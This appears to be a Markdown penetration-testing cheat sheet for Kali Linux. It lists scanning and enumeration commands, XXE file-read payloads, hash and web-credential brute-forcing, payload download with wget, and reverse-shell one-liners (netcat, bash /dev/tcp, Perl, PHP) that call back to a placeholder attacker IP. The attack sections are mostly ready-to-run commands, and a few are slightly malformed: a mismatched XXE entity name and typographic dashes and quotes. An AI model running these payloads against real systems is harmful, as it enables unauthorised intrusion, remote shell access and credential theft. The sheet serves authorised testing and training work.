
***

# Offensive Security Tools

***

<br />

Here you will find a useful collection of commands and file resource locations used in Pentesting operations. This reference is will go hand in hand with Kali Linux.

This is intended to be viewed in the blog found here: [Offensive Security Cheat Sheet](https://totes5706.github.io/Offensive-Security-Cheat-Sheet/)

<br />

***

# General Enumeration

***

<br />
 
## NMAP

<br />

```bash
# About: A network scanning tool that identifies devices, ports, services, and operating systems 
# Download: Pre-installed on Kali Linux 

# Usage
nmap -p- --min-rate 5000 -sC -sV {IP ADDRESS}

# UDP Scan
sudo nmap -sU  {IP ADDRESS}

# Flags 
# -p-: scans ALL ports
# --min-rate <number>: Send packets no slower than <number> per second
# -sC: equivalent to --script=default
# -sV: Probe open ports to determine service/version info
# -sU: UDP port scan
```

<br />

## NMAP Automator

<br />

```bash
# About: Useful script that automates multiple enumeration scans in succession
# Download: https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh

# Usage
./nmapAutomator.sh --host {IP ADDRESS} --type All

# Flags
# --type Network : Shows all live hosts in the host's network (~15 seconds)
# --type	Port    : Shows all open ports (~15 seconds)
# --type	Script  : Runs a script scan on found ports (~5 minutes)
# --type	Full    : Runs a full range port scan, then runs a thorough scan on new ports (~5-10 minutes)
# --type	UDP     : Runs a UDP scan "requires sudo" (~5 minutes)
# --type	Vulns   : Runs CVE scan and nmap Vulns scan on all found ports (~5-15 minutes)
# --type	Recon   : Suggests recon commands, then prompts to automatically run them
# --type	All     : Runs all the scans (~20-30 minutes)
```

<br />

***

# Port Enumeration

***

<br />

## FTP [21]

<br />

**ftp**

<br />

```bash
# About: Connect to FTP server
# Download: Pre-installed on Kali Linux

# Usage
ftp {IP ADDRESS}

# Additional Information
# Default Credentials: anonymous
# Directory Command:   dir
# Download Command:    get
# Upload Command:      put
```

<br />

<br />

## SSH [22] 

<br />

## DNS [53]

<br />

## TFTP [69]

<br />

**tftp**


<br />

```bash
# About: Connect to TFTP server
# Download: Pre-installed on Kali Linux

# Usage
tftp {IP ADDRESS}

# Additional Information
# Only detectable via UDP scan
# No authentication required
```

<br />

## FINGER [79]

<br />

## Web Server [80, 443]

<br />

**gobuster**

<br />

```bash
# About: Used to brute force web directories
# Download: https://github.com/OJ/gobuster/releases

# Usage
gobuster dir -u {IP ADDRESS} -w /usr/share/wordlists/dirb/common.txt

# Notes: Not recursive, only digs one level deep

# Alternative word lists & locations

┌──(kali㉿kali)-[/usr/share/wordlists/dirb]

big.txt  
catala.txt  
common.txt  
euskera.txt  
extensions_common.txt  
indexes.txt  
mutations_common.txt  
others  
small.txt  
spanish.txt  
stress  
vulns

┌──(kali㉿kali)-[/usr/share/wordlists/dirbuster]

apache-user-enum-1.0.txt      
apache-user-enum-2.0.txt
directories.jbrofuzz   
directory-list-1.0.txt  
directory-list-2.3-small.txt   
directory-list-lowercase-2.3-small.txt
directory-list-2.3-medium.txt 
directory-list-lowercase-2.3-medium.txt
```

<br />

**XXE - XML**

<br />

```bash
# About: Try against weak XML parsers


# Usage Windows
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>]>
<data>&test;</data>

# Usage Linux
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&test;</data>
```

<br />

## Kerberos [88] 

<br />

## POP3 [110] 

<br />

## SNMP [161] 

<br />

## LDAP [389]

<br />

## SMB [445]

**smbclient**

<br />

```bash
# About: Used to connect to SMB 
# Download: Pre-installed on Kali Linux

# Usage
# List all SMB Shares
smbclient -L {TARGET_IP}

# Authenticate with local credentials
smbclient -N \\\\{TARGET_IP}\\{SHARE} 

# Authenticate with Administrator 
smbclient -N \\\\{TARGET_IP}\\{SHARE} -U Administrator
```

<br />

## MSSQL [1433] 

<br />

## NFS [2049]


<br />

## RDP [3389]

<br />

## WINRM [5985, 5986] 

<br />

```bash
# About: A tool used to hack WINRM from a linux console
# Download: Pre-installed on Kali Linux

# Usage
evil-winrm -i {IP ADDRESS} -u {USERNAME} -p {PASSWORD}

# Note: Requires credentials
# {IP ADDRESS}: IP Address of the Server
# {USERNAME}:   User Authentication
# {PASSWORD}:   Password Authentication
```

<br />

# Password Cracking

***

## John The Ripper

<br />

```bash
# About: A tool used to crack passwords, hashes, and zip files 
# Download: Pre-installed on Kali Linux

# Usage - Crack a zip file {FILE.zip} and output hash into text file {FILE.txt} 
sudo zip2john {FILE.zip} > {FILE.txt}

# Usage - Crack a rar file {FILE.rar} and output hash into text file {FILE.txt} 
sudo rar2john {FILE.rar} > {FILE.txt}

# Usage - Crack a password file {FILE.txt}
john -w=/usr/share/wordlists/rockyou.txt {FILE.txt}

# --format={HASH}: Specifiy a hash type to crack (see below)

:' 
descrypt, bsdicrypt, md5crypt, md5crypt-long, bcrypt, scrypt, LM, AFS, 
tripcode, AndroidBackup, adxcrypt, agilekeychain, aix-ssha1, aix-ssha256, 
aix-ssha512, andOTP, ansible, argon2, as400-des, as400-ssha1, asa-md5, 
AxCrypt, AzureAD, BestCrypt, BestCryptVE4, bfegg, Bitcoin, BitLocker, 
bitshares, Bitwarden, BKS, Blackberry-ES10, WoWSRP, Blockchain, chap, 
Clipperz, cloudkeychain, dynamic_n, cq, CRC32, cryptoSafe, sha1crypt, 
sha256crypt, sha512crypt, Citrix_NS10, dahua, dashlane, diskcryptor, Django, 
django-scrypt, dmd5, dmg, dominosec, dominosec8, DPAPImk, dragonfly3-32, 
dragonfly3-64, dragonfly4-32, dragonfly4-64, Drupal7, eCryptfs, eigrp, 
electrum, EncFS, enpass, EPI, EPiServer, ethereum, fde, Fortigate256, 
Fortigate, FormSpring, FVDE, geli, gost, gpg, HAVAL-128-4, HAVAL-256-3, hdaa, 
hMailServer, hsrp, IKE, ipb2, itunes-backup, iwork, KeePass, keychain, 
keyring, keystore, known_hosts, krb4, krb5, krb5asrep, krb5pa-sha1, krb5tgs, 
krb5-17, krb5-18, krb5-3, kwallet, lp, lpcli, leet, lotus5, lotus85, LUKS, 
MD2, mdc2, MediaWiki, monero, money, MongoDB, scram, Mozilla, mscash, 
mscash2, MSCHAPv2, mschapv2-naive, krb5pa-md5, mssql, mssql05, mssql12, 
multibit, mysqlna, mysql-sha1, mysql, net-ah, nethalflm, netlm, netlmv2, 
net-md5, netntlmv2, netntlm, netntlm-naive, net-sha1, nk, notes, md5ns, 
nsec3, NT, o10glogon, o3logon, o5logon, ODF, Office, oldoffice, 
OpenBSD-SoftRAID, openssl-enc, oracle, oracle11, Oracle12C, osc, ospf, 
Padlock, Palshop, Panama, PBKDF2-HMAC-MD4, PBKDF2-HMAC-MD5, PBKDF2-HMAC-SHA1, 
PBKDF2-HMAC-SHA256, PBKDF2-HMAC-SHA512, PDF, PEM, pfx, pgpdisk, pgpsda, 
pgpwde, phpass, PHPS, PHPS2, pix-md5, PKZIP, po, postgres, PST, PuTTY, 
pwsafe, qnx, RACF, RACF-KDFAES, radius, RAdmin, RAKP, rar, RAR5, Raw-SHA512, 
Raw-Blake2, Raw-Keccak, Raw-Keccak-256, Raw-MD4, Raw-MD5, Raw-MD5u, Raw-SHA1, 
Raw-SHA1-AxCrypt, Raw-SHA1-Linkedin, Raw-SHA224, Raw-SHA256, Raw-SHA3, 
Raw-SHA384, restic, ripemd-128, ripemd-160, rsvp, RVARY, Siemens-S7, 
Salted-SHA1, SSHA512, sapb, sapg, saph, sappse, securezip, 7z, Signal, SIP, 
skein-256, skein-512, skey, SL3, Snefru-128, Snefru-256, LastPass, SNMP, 
solarwinds, SSH, sspr, Stribog-256, Stribog-512, STRIP, SunMD5, SybaseASE, 
Sybase-PROP, tacacs-plus, tcp-md5, telegram, tezos, Tiger, tc_aes_xts, 
tc_ripemd160, tc_ripemd160boot, tc_sha512, tc_whirlpool, vdi, OpenVMS, vmx, 
VNC, vtp, wbb3, whirlpool, whirlpool0, whirlpool1, wpapsk, wpapsk-pmk, 
xmpp-scram, xsha, xsha512, zed, ZIP, ZipMonster, plaintext, has-160, 
HMAC-MD5, HMAC-SHA1, HMAC-SHA224, HMAC-SHA256, HMAC-SHA384, HMAC-SHA512, 
dummy, crypt
'
```

<br />

## Ffuf

<br />

```bash
# About: A tool used to brute force web credentials
# Download: Pre-installed on Kali Linux

# Usage - One variable FUZZ
ffuf -c -request {FILE.req} -request-proto http -w /usr/share/seclists/Passwords/probable-v2-top1575.txt -fr "{FILTER}"


# EXAMPLE {FILE}
username=admin$password=FUZZ

```

<br />

# Payload File Transfer

***

## Python Server [STEP 1]

<br />

```bash
# About: A python command used to open a server on the client machine
# Download: Pre-installed on Kali Linux

# USAGE - Host on client machine
sudo python3 -m http.server {PORT}

# {PORT}: Port to open for file transfer
```
<br />

## WGET [STEP 2] 

<br />

```bash
# About: A command used to download files on the current machine
# Download: Pre-installed on Kali Linux

# Usage - Download on server machine
wget http://{IP ADDRESS}/{FILE} -outfile {FILE}

# {IP ADDRESS}: IP Address of the client from step one (python server)
# {FILE}:       The payload to be transferred
```
<br />

# Privilege Escalation

<br />

## Windows - Winpeas

<br />

[Winpeas](https://github.com/carlospolop/PEASS-ng/releases)

<br />

```bash
# Enumeration

# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
<br />

## Linux - Linpeas

<br />

[Linpeas](https://github.com/carlospolop/PEASS-ng/releases)

[GTFOBINS](https://gtfobins.github.io/)

<br />

```bash

#Check commands you can execute with sudo
sudo -l 

 #Find all SUID binaries
find / -perm -4000 2>/dev/null

# Web files
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
<br />

# Reverse Shell

## NC Listen - Client [STEP 1]

<br />

```bash
# About: A command used to listen to requests from a defined port
# Download: Pre-installed on Kali Linux

# Usage
sudo nc –lnvp {PORT}

# {PORT}: Select the port used to listen
```
<br />

## NC Execute - Server [STEP 2]

```bash
# With netcat installed

# Usage - Windows
nc.exe -e cmd.exe {IP ADDRESS} {PORT}

# Usage - Linux 
nc {IP ADDRESS} {PORT} –e /bin/bash

# ===========================================

# Without netcat installed

# Usage - transfer payload via file transfer and execute binary

# Usage - Linux
bash -i >& /dev/tcp/{IP ADDRESS}/{PORT} 0>&1

# Usage - Perl
perl -e ‘use Socket;$i=”{IP ADDRESS}″;$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

# Usage - PHP
php -r ‘$sock=fsockopen(“{IP ADDRESS}”,{PORT});exec(“/bin/sh -i <&3 >&3 2>&3”);’

# {IP ADDRESS}: IP Address of the client from step one (listener)
# {PORT}: Port of the client from step one (listener)
```
<br />

## Reverse Shell Generator

<br />

[Reverse Shell Generator](https://www.revshells.com/)

<br />

# Shell Upgrade

<br />

## Python

<br />

```bash
# About: A command to spawn a new shell using python
# Download: May or may not be installed on server machine

# Usage 
python3 -c 'import pty;pty.spawn("/bin/bash")'

python -c 'import pty;pty.spawn("/bin/bash")'

# Additional Functionality
CTRL&Z
stty raw -echo; fg;
export TERM=xterm
```
